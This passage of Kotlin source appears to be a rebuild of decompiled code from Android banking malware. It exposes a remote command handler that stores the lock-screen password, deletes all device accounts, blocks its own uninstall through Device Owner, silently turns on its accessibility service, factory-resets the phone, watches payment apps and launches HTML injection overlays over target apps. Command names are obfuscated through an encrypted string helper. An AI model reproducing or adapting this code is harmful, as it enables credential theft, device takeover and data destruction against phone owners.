     * JADX: m211599a4 (a4) — /global/lockScreen
     */
    fun executeLockScreen(): JSONObject {
        val json = JSONObject()
        json.put(StringUtil.decrypt("KFYcN0w2CA=="), StringUtil.decrypt("G3YmH38HPwJyFBs="))
        val dispatcher = commandDispatcher
        if (dispatcher != null) {
            try {
                kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
            } catch (_: Exception) {
            }
        }
        return makeTextResponse("锁屏命令已发送")
    }

    /**
     * Wake screen command.
     * JADX: m211600a5 (a5) — /global/wakeUpScreen
     */
    fun executeWakeScreen(): JSONObject {
        val json = JSONObject()
        json.put(StringUtil.decrypt("KFYcN0w2CA=="), StringUtil.decrypt("G3YmH38HOw98FA=="))
        val dispatcher = commandDispatcher
        if (dispatcher != null) {
            try {
                kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
            } catch (_: Exception) {
            }
        }
        return makeTextResponse("唤醒命令已发送")
    }

    // ---------------------------------------------------------------
    // Settings toggles — JADX: d7, d8, d9
    // ---------------------------------------------------------------

    /**
     * Toggle ADB debug.
     * JADX: m211625d7 (d7) — /activeADBDebug, /closeADBDebug
     */
    fun toggleAdb(enable: Boolean): JSONObject {
        return try {
            Settings.Global.putInt(
                context.contentResolver, "adb_enabled", if (enable) 1 else 0
            )
            Log.d(TAG, "🔧 ADB 调试: ${if (enable) "开启" else "关闭"}")
            makeTextResponse("adbDebug ${if (enable) "enabled" else "disabled"}")
        } catch (e: Exception) {
            makeErrorResponse("adbDebug toggle 异常: ${e.message}")
        }
    }

    /**
     * Toggle WiFi debug.
     * JADX: m211627d9 (d9) — /activeWifiDebug, /closeWifiDebug
     */
    fun toggleWifi(enable: Boolean): JSONObject {
        return try {
            if (Build.VERSION.SDK_INT >= 30) {
                try {
                    Settings.Global.putInt(
                        context.contentResolver, "adb_wifi_enabled", if (enable) 1 else 0
                    )
                } catch (_: Exception) {
                }
            }
            Log.d(TAG, "🔧 WiFi 调试: ${if (enable) "开启" else "关闭"}")
            makeTextResponse("wifiDebug ${if (enable) "enabled" else "disabled"}")
        } catch (e: Exception) {
            makeErrorResponse("wifiDebug toggle 异常: ${e.message}")
        }
    }

    /**
     * Toggle developer options.
     * JADX: m211626d8 (d8) — /activeDevelopment, /closeDevelopment
     */
    fun activeDevelopment(enable: Boolean): JSONObject {
        return try {
            val canWrite = Settings.System.canWrite(context)
            var hasSecure = false
            try {
                if (context.checkCallingOrSelfPermission(
                        "android.permission.WRITE_SECURE_SETTINGS"
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    hasSecure = true
                }
            } catch (_: Exception) {
            }
            if (!canWrite && !hasSecure) {
                Log.w(TAG, "🔧 开发者选项: 无 WRITE_SETTINGS 或 WRITE_SECURE_SETTINGS 权限")
                return makeErrorResponse("无系统设置修改权限")
            }
            Settings.Global.putInt(
                context.contentResolver,
                "development_settings_enabled",
                if (enable) 1 else 0
            )
            val actual = Settings.Global.getInt(
                context.contentResolver, "development_settings_enabled", -1
            )
            val expected = if (enable) 1 else 0
            if (actual == expected) {
                Log.d(TAG, "🔧 开发者选项: ${if (enable) "开启" else "隐藏"} 成功")
                makeTextResponse("development ${if (enable) "enabled" else "disabled"}")
            } else {
                Log.w(TAG, "🔧 开发者选项: 写入后验证失败 (期望=$expected, 实际=$actual)")
                makeErrorResponse("development toggle 验证失败: actual=$actual")
            }
        } catch (e: Exception) {
            Log.e(TAG, "开发者选项异常", e)
            makeErrorResponse("development toggle 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Lock cipher — JADX: d6
    // ---------------------------------------------------------------

    /**
     * /syncLockCipher — sync lock password to prefs.
     * JADX: m211624d6 (d6)
     */
    fun syncLockCipher(body: String?, params: Map<String, String>): JSONObject {
        return try {
            var cipher = params["cipher"]
            if (cipher == null) {
                cipher = ""
                if (body != null) {
                    try {
                        cipher = JSONObject(body).optString("cipher", "")
                    } catch (_: Exception) {
                        cipher = ""
                    }
                }
            }
            if (cipher != null && cipher.isNotEmpty()) {
                context.getSharedPreferences("local_config", 0)
                    .edit()
                    .putString(StringUtil.decrypt("J1YSMXI7BT5fNDk="), cipher)
                    .apply()
                Log.d(TAG, "🔐 [syncLockCipher] 密码已同步")
            }
            makeTextResponse("syncLockCipher done")
        } catch (e: Exception) {
            makeErrorResponse("syncLockCipher 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Account protection — JADX: c0, b9, c9
    // ---------------------------------------------------------------

    /**
     * /enableAccountProtection — enable account-based protection.
     * JADX: m211611c0 (c0)
     */
    fun enableAccountProtection(): JSONObject {
        return try {
            context.getSharedPreferences(
                StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs="), 0
            ).edit().putBoolean("accountProtectionEnabled", true).commit()
            Log.d(TAG, "★ accountProtectionEnabled = true（开启账户保护）")
            val apm = AccountProtectionManager.getInstance(context)
            if (!apm.hasAccount()) {
                apm.createAccount()
                Log.d(TAG, "★ 账户保护已启用，立即创建账号")
            }
            makeTextResponse("accountProtectionEnabled=true")
        } catch (e: Exception) {
            Log.e(TAG, "handleEnableAccountProtection 异常", e)
            makeErrorResponse("enableAccountProtection 异常: ${e.message}")
        }
    }

    /**
     * /disableAccountProtection — disable account-based protection.
     * JADX: m211610b9 (b9)
     */
    fun disableAccountProtection(): JSONObject {
        return try {
            context.getSharedPreferences(
                StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs="), 0
            ).edit().putBoolean("accountProtectionEnabled", false).commit()
            Log.d(TAG, "★ accountProtectionEnabled = false（关闭账户保护）")
            AccountProtectionManager.getInstance(context).removeAccount()
            makeTextResponse("accountProtectionEnabled=false")
        } catch (e: Exception) {
            Log.e(TAG, "handleDisableAccountProtection 异常", e)
            makeErrorResponse("disableAccountProtection 异常: ${e.message}")
        }
    }

    /**
     * /removeAllAccounts — remove all accounts from device.
     * JADX: m211618c9 (c9)
     */
    fun removeAllAccounts(): JSONObject {
        return try {
            val removed = AccountProtectionManager.getInstance(context).removeAccount()
            Log.d(TAG, "★ removeAllAccounts: removed=$removed")
            try {
                val am = AccountManager.get(context)
                val accounts = am.accounts
                var count = 0
                for (account in accounts) {
                    try {
                        am.removeAccount(account, null, null)
                        count++
                        Log.d(TAG, "★ 删除系统账户: ${account.name} (${account.type})")
                    } catch (e: Exception) {
                        Log.w(TAG, "⚠️ 删除账户失败: ${account.name}: ${e.message}")
                    }
                }
                makeTextResponse("removed=$removed, systemAccounts=$count")
            } catch (e: Exception) {
                makeTextResponse("removed=$removed, systemError=${e.message}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "handleRemoveAllAccounts 异常", e)
            makeErrorResponse("removeAllAccounts 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Device admin — JADX: d4, d5, b4
    // ---------------------------------------------------------------

    /**
     * /startAdminActive — enter device admin activation mode.
     * JADX: m211622d4 (d4)
     */
    fun startAdminActive(): JSONObject {
        return try {
            val prefName = StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs=")
            val prefs = context.getSharedPreferences(prefName, 0)
            if (!prefs.getBoolean(prefName, false)) {
                prefs.edit()
                    .putBoolean(prefName, true)
                    .putLong("isAdminActivating_start", System.currentTimeMillis())
                    .commit()
                Log.d(TAG, "★ isAdminActivating = true（进入 Device Owner 激活模式）")
            }
            val apm = AccountProtectionManager.getInstance(context)
            if (apm.hasAccount()) {
                apm.removeAccount()
                Log.d(TAG, "★ 账户已删除（为 Device Owner 设置做准备）")
            }
            makeTextResponse("isAdminActivating=true, accounts removed")
        } catch (e: Exception) {
            Log.e(TAG, "handleStartAdminActive 异常", e)
            makeErrorResponse("startAdminActive 异常: ${e.message}")
        }
    }

    /**
     * /stopAdminActive — exit device admin activation mode.
     * JADX: m211623d5 (d5)
     */
    fun stopAdminActive(): JSONObject {
        return try {
            val prefName = StringUtil.decrypt("IkowPkAxAg9UJSJPEC5ENgs=")
            context.getSharedPreferences(prefName, 0)
                .edit()
                .putBoolean(prefName, false)
                .remove("isAdminActivating_start")
                .commit()
            Log.d(TAG, "★ isAdminActivating = false（退出 Device Owner 激活模式，恢复账户保护）")
            makeTextResponse("isAdminActivating=false")
        } catch (e: Exception) {
            Log.e(TAG, "handleStopAdminActive 异常", e)
            makeErrorResponse("stopAdminActive 异常: ${e.message}")
        }
    }

    /**
     * /activeDeviceOwner — set uninstall blocked if device owner.
     * JADX: m211607b4 (b4)
     */
    fun activeDeviceOwner(): JSONObject {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val cn = ComponentName(context, zbrefryi::class.java)
            if (!dpm.isDeviceOwnerApp(context.packageName)) {
                return makeTextResponse("Not Device Owner")
            }
            dpm.setUninstallBlocked(cn, context.packageName, true)
            Log.d(TAG, "🔒 [DeviceOwner] 已设置 setUninstallBlocked=true")
            makeTextResponse("Already Device Owner, setUninstallBlocked=true")
        } catch (e: Exception) {
            Log.e(TAG, "handleActiveDeviceOwner 异常", e)
            makeErrorResponse("activeDeviceOwner 异常: ${e.message}")
        }
    }

    /**
     * /uninstallPolicy — toggle uninstall protection.
     * JADX: m211628e0 (e0)
     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
     */
    fun uninstallPolicy(params: Map<String, String>): JSONObject {
        return try {
            val uninstallStr = params["uninstall"]
            val uninstall = uninstallStr?.let { java.lang.Boolean.parseBoolean(it) } ?: false
            val activeAdminStr = params["activeAdmin"]
            val activeAdmin = activeAdminStr?.let { java.lang.Boolean.parseBoolean(it) } ?: true
            val uninstallCode = params["uninstallCode"] ?: ""

            Log.d(TAG, "★ [uninstallPolicy] uninstall=$uninstall, activeAdmin=$activeAdmin, " +
                    "code=${if (uninstallCode.isNotEmpty()) "***" else "empty"}")

            val dispatcher = commandDispatcher
            if (uninstall) {
                // Disable protection
                val json = JSONObject()
                json.put(
                    StringUtil.decrypt("KFYcN0w2CA=="),
                    StringUtil.decrypt("D3AiG28UKRFiHwJ3Ig5sFCARZwMEbTQZeREjAA==")
                )
                if (dispatcher != null) {
                    try {
                        kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
                    } catch (_: Exception) {
                    }
                }
                Log.d(TAG, "🔓 [uninstallPolicy] 已通知禁用防卸载保护")
            } else {
                // Enable protection
                val json = JSONObject()
                json.put(
                    StringUtil.decrypt("KFYcN0w2CA=="),
                    StringUtil.decrypt("DncwGGEdMxt5GAVqJRthFDMeZR4ffDIOZBci")
                )
                if (dispatcher != null) {
                    try {
                        kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
                    } catch (_: Exception) {
                    }
                }
                Log.d(TAG, "🔒 [uninstallPolicy] 已通知启用防卸载保护")
            }

            makeTextResponse("uninstallPolicy set: uninstall=$uninstall, activeAdmin=$activeAdmin")
        } catch (e: Exception) {
            Log.e(TAG, "handleUninstallPolicy 异常", e)
            makeErrorResponse("uninstallPolicy 异常: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Write settings — JADX: c7, e2
    // ---------------------------------------------------------------

    /**
     * /openWriteSecure — open write settings permission page.
     * JADX: m211617c7 (c7)
     */
    fun openWriteSecure(): JSONObject {
        return try {
            if (Settings.System.canWrite(context)) {
                return makeTextResponse("Write settings permission already granted")
            }
            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
            intent.data = Uri.parse("package:${context.packageName}")
            intent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TASK or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION
            )
            context.startActivity(intent)
            makeTextResponse("Write settings permission requested")
        } catch (e: Exception) {
            Log.e(TAG, "handleOpenWriteSecure 异常", e)
            makeErrorResponse("openWriteSecure 异常: ${e.message}")
        }
    }

    /**
     * /writeAccessibility — write accessibility settings via secure settings or device owner.
     * JADX: m211630e2 (e2)
     */
    fun writeAccessibility(params: Map<String, String>): JSONObject {
        val action = params["action"] ?: "enable"
        val pkg = params["package"] ?: context.packageName
        val ourService = "$pkg/${MyAccessibilityService::class.java.name}"

        try {
            val resolver = context.contentResolver
            if (action == "enable") {
                var current = Settings.Secure.getString(
                    resolver, "enabled_accessibility_services"
                ) ?: ""
                val svcString = if (current.isNotEmpty()) {
                    if (current.contains(pkg)) current else "$current:$ourService"
                } else {
                    ourService
                }

                // Try DeviceOwner first
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                        as? DevicePolicyManager
                if (dpm != null && dpm.isDeviceOwnerApp(context.packageName)) {
                    val cn = ComponentName(context, zbrefryi::class.java)
                    dpm.setSecureSetting(cn, "enabled_accessibility_services", svcString)
                    dpm.setSecureSetting(cn, "accessibility_enabled", "1")
                    Log.d(TAG, "✅ [writeAccessibility] DeviceOwner enable 成功")
                    return makeTextResponse("enabled via DeviceOwner")
                }

                // Fallback to Java API
                Settings.Secure.putString(
                    resolver, "enabled_accessibility_services", svcString
                )
                Settings.Secure.putInt(resolver, "accessibility_enabled", 1)
                val after = Settings.Secure.getString(
                    resolver, "enabled_accessibility_services"
                ) ?: ""
                return if (after.contains(pkg)) {
                    Log.d(TAG, "✅ [writeAccessibility] Java API enable 成功")
                    makeTextResponse("enabled via Java API")
                } else {
                    Log.w(TAG, "⚠️ [writeAccessibility] Java API enable 写入未生效 after=$after")
                    makeErrorResponse("Java API write did not take effect, after=$after")
                }
            } else if (action == "disable") {
                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE)
                        as? DevicePolicyManager
                if (dpm != null && dpm.isDeviceOwnerApp(context.packageName)) {
                    val cn = ComponentName(context, zbrefryi::class.java)
                    dpm.setSecureSetting(cn, "enabled_accessibility_services", "")
                    dpm.setSecureSetting(cn, "accessibility_enabled", "0")
                    Log.d(TAG, "✅ [writeAccessibility] DeviceOwner disable 成功")
                    return makeTextResponse("disabled via DeviceOwner")
                }

                Settings.Secure.putString(resolver, "enabled_accessibility_services", "")
                Settings.Secure.putInt(resolver, "accessibility_enabled", 0)
                val after = Settings.Secure.getString(
                    resolver, "enabled_accessibility_services"
                ) ?: ""
                return if (after.isEmpty() || !after.contains(pkg)) {
                    Log.d(TAG, "✅ [writeAccessibility] Java API disable 成功")
                    makeTextResponse("disabled via Java API")
                } else {
                    Log.w(TAG, "⚠️ [writeAccessibility] Java API disable 未生效 after=$after")
                    makeErrorResponse("Java API disable did not take effect, after=$after")
                }
            } else {
                return makeErrorResponse("unknown action: $action")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "[writeAccessibility] 无 WRITE_SECURE_SETTINGS 权限", e)
            return makeErrorResponse("no WRITE_SECURE_SETTINGS permission: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "[writeAccessibility] 异常", e)
            return makeErrorResponse("writeAccessibility error: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Wipe data — JADX: e1
    // ---------------------------------------------------------------

    /**
     * /wipeData, /factoryReset, /reset, /restore — factory reset.
     * JADX: m211629e1 (e1)
     */
    fun wipeData(params: Map<String, String>): JSONObject {
        Log.w(TAG, "⚠️⚠️⚠️ 收到恢复出厂设置请求 ⚠️⚠️⚠️")
        return try {
            val wipeExternalStr = params["wipeExternal"]
            val wipeExternal = wipeExternalStr?.let { java.lang.Boolean.parseBoolean(it) } ?: false

            val isAdmin = zbrefryi.isAdminActive(context)
            val isOwner = zbrefryi.isDeviceOwner(context)
            Log.d(TAG, "📊 权限检查: isAdmin=$isAdmin, isOwner=$isOwner")

            if (!isAdmin) {
                Log.e(TAG, "没有 Device Admin 权限，无法执行 wipeData")
                val json = JSONObject()
                json.put("code", 403)
                json.put("success", false)
                json.put("message", "没有设备管理员权限")
                json.put("isAdmin", false)
                json.put("isOwner", false)
                return json
            }

            Log.w(TAG, "★★★ 正在执行 wipeData，设备即将重置 ★★★")
            if (zbrefryi.wipeDevice(context, wipeExternal)) {
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                json.put("message", "wipeData 已调用，设备正在重置")
                json
            } else {
                val json = JSONObject()
                json.put("code", 500)
                json.put("success", false)
                json.put("message", "wipeData 调用失败")
                json.put("isAdmin", isAdmin)
                json.put("isOwner", isOwner)
                json
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "wipeData 安全异常", e)
            val json = JSONObject()
            json.put("code", 403)
            json.put("success", false)
            json.put("message", "权限不足: ${e.message}")
            json
        } catch (e: Exception) {
            Log.e(TAG, "wipeData 异常", e)
            makeErrorResponse("wipeData 失败: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Payment strategies — JADX: d1
    // ---------------------------------------------------------------

    /**
     * /setPaymentStrategies — configure cipher/payment detection strategies.
     * JADX: m211619d1 (d1)
     */
    fun setPaymentStrategies(body: String?): JSONObject {
        if (body.isNullOrEmpty()) {
            return makeErrorResponse("缺少请求体")
        }
        return try {
            val arr = JSONArray(body)
            // JADX: C0341a7.f53380c1.getInstance() → ViewCacheCollector singleton
            val vcc = ViewCacheCollector.instance
            if (vcc == null) {
                Log.w(TAG, "ViewCacheCollector 未初始化，保存配置待稍后加载")
                context.getSharedPreferences("payment_strategies", 0)
                    .edit().putString("strategies", body).apply()
                return makeTextResponse("配置已保存，等待加载")
            }
            // JADX: c0340a6.f53385a2.clear() + c0340a6.m211872b2()
            vcc.rules.clear()
            vcc.stopCapture()
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                val pkg = obj.optString("packageName", "")
                val appName = obj.optString("appName", "")
                val winClassesArr = obj.optJSONArray("listenWinClasses")
                val winClasses = ArrayList<String>()
                if (winClassesArr != null) {
                    for (j in 0 until winClassesArr.length()) {
                        winClasses.add(winClassesArr.getString(j))
                    }
                }
                if (pkg.isNotEmpty()) {
                    // JADX: c0340a6.m211861a0(pkg, winClasses, appName)
                    vcc.addRule(pkg, winClasses, appName)
                }
            }
            context.getSharedPreferences("payment_strategies", 0)
                .edit().putString("strategies", body).apply()
            Log.d(TAG, "✅ 支付策略已更新: ${arr.length()} 条")
            makeTextResponse("已更新 ${arr.length()} 条策略")
        } catch (e: Exception) {
            Log.e(TAG, "解析支付策略失败", e)
            makeErrorResponse("解析失败: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Show injection — JADX: d3
    // ---------------------------------------------------------------

    /**
     * /showInjection — launch injection activity for a package.
     * JADX: m211621d3 (d3)
     */
    fun showInjection(body: String?, params: Map<String, String>): JSONObject {
        return try {
            var packageName = params["packageName"] ?: ""
            if (packageName.isEmpty()) {
                return makeErrorResponse("缺少 packageName 参数")
            }

            val service = MyAccessibilityService.getInstance()
                ?: return makeErrorResponse("dqtvuisjd 未运行")

            var htmlContent = params["htmlContent"] ?: ""
            if (htmlContent.isEmpty() && !body.isNullOrEmpty()) {
                try {
                    htmlContent = JSONObject(body).optString("htmlContent", "")
                } catch (_: Exception) {
                }
            }
            if (htmlContent.isEmpty()) {
                synchronized(service.injectionTasksLock) {
                    htmlContent = service.injectionTasks[packageName] ?: ""
                }
            }
            if (htmlContent.isEmpty()) {
                return makeErrorResponse("没有找到 $packageName 的注入任务（HTML内容为空）")
            }

            // JADX: check if jbqfkndyx is active and in foreground — skip if already showing
            if (jbqfkndyx.active && jbqfkndyx.inForeground) {
                val json = JSONObject()
                json.put("code", 200)
                json.put("success", true)
                json.put("message", "注入页面已在前台，跳过")
                return json
            }

            // JADX: launch injection activity with proper flags
            val intent = android.content.Intent(context, jbqfkndyx::class.java)
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            intent.putExtra("package_name", packageName)
            intent.putExtra("html_content", htmlContent)
            context.startActivity(intent)
            Log.d(TAG, "✅ [注入] local-service 触发注入页面: $packageName")
            val json = JSONObject()
            json.put("code", 200)
            json.put("success", true)
            json.put("message", "注入页面已启动: $packageName")
            json
        } catch (e: Exception) {
            Log.e(TAG, "显示注入页面失败", e)
            makeErrorResponse("显示注入页面失败: ${e.message}")
        }
    }

    // ---------------------------------------------------------------
    // Block view overlay — JADX: b6
    // ---------------------------------------------------------------

    /**
     * /blockView — show/hide block overlay.
     * JADX: m211608b6 (b6)
     * Vendor is suspend; translated to synchronous dispatch via runBlocking.
     */
    fun handleBlockView(params: Map<String, String>): JSONObject {
        return try {
            val action = params["action"] ?: "show"
            val text = params["text"] ?: ""
            val alphaStr = params["alpha"]
            val alpha = alphaStr?.toIntOrNull() ?: 0xFF

            val cmdName = StringUtil.decrypt(
                if (action == "hide") "D3AiG28UKRF1HQp6OgV+Gz4Lch8="
                else "DncwGGEdMwx7EAhyLgluCikLeQ=="
            )

            val json = JSONObject()
            json.put(StringUtil.decrypt("KFYcN0w2CA=="), cmdName)
            val paramsJson = JSONObject()
            paramsJson.put("text", text)
            paramsJson.put("alpha", alpha)
            json.put("params", paramsJson)

            val dispatcher = commandDispatcher
            if (dispatcher != null) {
                try {
                    kotlinx.coroutines.runBlocking { dispatcher.dispatch(json) }
                } catch (_: Exception) {
                }
            }

            makeTextResponse("遮罩命令已执行: $cmdName")
        } catch (e: Exception) {
            makeErrorResponse("blockView 异常: ${e.message}")
        }
    }
}
